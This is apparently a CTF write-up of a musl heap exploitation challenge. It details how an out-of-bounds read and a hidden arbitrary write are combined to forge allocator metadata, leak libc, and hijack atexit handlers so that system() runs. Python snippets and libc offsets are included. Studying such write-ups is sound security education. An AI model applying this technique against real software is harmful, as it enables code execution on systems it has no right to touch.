---
layout: post
title: "Atypical Heap Revenge"
date: 2026-06-04
categories: [Pwn]
difficulty: Medium
platform: UNbreakable Romania 2026
tags: [pwn, heap, musl, libc, allocator]
excerpt: "Abusing an arbitrary 8-byte write and an out-of-bounds read to corrupt musl allocator metadata and hijack atexit handlers for code execution."
---

## Summary

This challenge provides a musl-based note manager with two vulnerabilities:

* An undocumented menu option that grants an arbitrary aligned 8-byte write.
* An out-of-bounds read that leaks heap and allocator metadata.

The exploit uses the OOB read to leak heap pointers, corrupts musl allocator metadata to obtain a controlled allocation, leaks a libc address, calculates the musl base address, and finally overwrites musl's internal `atexit()` structures to execute:

```bash
system("cat flag.txt||cat /srv/dist/flag.txt")
```

and retrieve the flag.

## Analysis

### Recon

The supplied files included:

* Challenge binary
* Source code (`chall.c`)
* Matching `libc.so`

Reviewing the source revealed the following menu definitions:

```c
#define NOTE_MAGIC 5
#define NOTE_EXIT 6
```

Although the menu suggests option 5 is Exit, it actually invokes a hidden handler.

The handler performs:

```c
*ptr = value;
```

after checking only that the address is 8-byte aligned.

This provides an arbitrary 8-byte write primitive that can be used repeatedly.

### Arbitrary Write

The hidden menu option accepts:

* Address
* Value

and writes directly to memory:

```c
*ptr = value;
```

No bounds checks are performed.

---

### Out-of-Bounds Read

The read functionality validates only that:

```c
size <= MAX_NOTE_SIZE
```

where:

```c
MAX_NOTE_SIZE = 0x100
```

It never verifies the actual size of the allocated note.

As a result, reading 0x100 bytes from a smaller allocation leaks adjacent heap memory and musl allocator metadata.

## Exploitation

### Heap Leak

The exploit first creates a stable heap layout:

```python
for i in range(36):
    alloc(i, 0xA0)
    write_note(i, b"A" * 0x20)
```

An out-of-bounds read on note 30 reveals allocator metadata:

```python
l30 = read_note(30, 0x100)
m = u64(l30[0xD0:0xD8])
```

The leaked pointer `m` points into musl's allocator structures and is later used to forge metadata.

### Allocator Corruption

A fake allocator group is built immediately before the leaked metadata:

```python
fake = m - 0x300

magic(fake + 0x0, m)
magic(fake + 0x8, 0)

magic(m + 0x10, fake)
magic(m + 0x18, 1)
```

By corrupting internal allocator fields, the next allocation of the same size class returns memory inside a controlled metadata region.

### Libc Leak

After allocator corruption:

```python
alloc(40, 0xA0)

l40 = read_note(40, 0x100)
leak = u64(l40[0x20:0x28])

libc = leak - 0xA68C0
```

A stable libc pointer is leaked and used to calculate the musl base address.

Relevant offsets:

```python
SYSTEM  = 0x48368
BUILTIN = 0xA36A0
HEAD    = 0xA5DC8
SLOT    = 0xA5FE4
```

### Hijacking atexit

musl maintains an internal linked list of callbacks executed during `exit()`.

The exploit forges a fake callback structure that invokes:

```c
system("cat flag.txt||cat /srv/dist/flag.txt")
```

A command string is written into writable libc memory:

```python
CMD = b"cat flag.txt||cat /srv/dist/flag.txt\x00"
```

The forged callback is then installed:

```python
magic(b + 0x0, 0)
magic(b + 0x8, libc + SYSTEM)

magic(b + 0x108, cmd_addr)

magic(libc + HEAD, b)
```

Finally, the slot is activated:

```python
magic(libc + SLOT - 4, 0x100000000)
```

and normal program termination is triggered:

```python
io.sendlineafter(b"> ", b"6")
```

Execution flow becomes:

```text
exit()
 -> atexit handler
 -> system("cat flag.txt||cat /srv/dist/flag.txt")
```

### Final Exploit

```python
# Full exploit omitted for brevity
# See original solve script
```

The exploit reliably leaks heap metadata, obtains a libc leak, hijacks musl's atexit mechanism, and executes a command that prints the flag.

## Flag

```text
CTF{Y34h_th1s_1s_th3_actu4l_fl4g_n0w_my_b4d_0e13b023f341b48d}
```
